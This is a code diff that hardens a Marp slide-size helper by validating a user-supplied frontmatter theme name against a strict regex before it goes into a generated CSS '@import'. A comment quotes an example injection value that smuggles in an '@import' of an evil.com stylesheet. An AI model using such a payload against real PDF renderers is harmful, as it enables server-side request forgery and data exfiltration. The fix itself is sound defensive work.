@@ -47,6 +47,16 @@ const NUMERIC_SIZE_RE = /^(\d{3,5})[xX](\d{3,5})$/;
 const MIN_CANVAS_PX = 200;
 const MAX_CANVAS_PX = 3840;
 
+// `meta.theme` arrives from frontmatter (user-controlled) and is
+// interpolated into the generated theme's `@import "<userTheme>"`
+// directive. Without validation, a value like
+//   theme: "default"; @import "https://evil.com/css"; /*
+// would inject extra `@import` directives, and on the server PDF
+// path (no CSP) Puppeteer would dutifully fetch the external CSS
+// during render — an exfiltration / SSRF vector. Restrict to plain
+// theme-name characters; anything else falls back to "default".
+const SAFE_THEME_NAME_RE = /^[A-Za-z0-9_-]+$/;
+
 interface CustomDimensions {
   width: number;
   height: number;
@@ -91,7 +101,12 @@ export function applyCustomMarpSize(marp: MarpLike, markdown: string): string {
   const dims = parseCustomSize(sizeValue);
   if (!dims) return markdown;
 
-  const userTheme = typeof meta.theme === "string" ? meta.theme.trim() : "default";
+  const rawTheme = typeof meta.theme === "string" ? meta.theme.trim() : "default";
+  // Drop hostile / non-identifier theme names down to "default"
+  // BEFORE building the generated theme name or its `@import` —
+  // otherwise quotes / `@import` tokens / CSS injection slip into
+  // the registered CSS and Puppeteer would fetch them.
+  const userTheme = SAFE_THEME_NAME_RE.test(rawTheme) ? rawTheme : "default";
   // Avoid recursion if a previous render already swapped in a
   // generated theme name — re-applying would compose-on-compose.
   if (userTheme.startsWith("mc_size_")) return markdown;
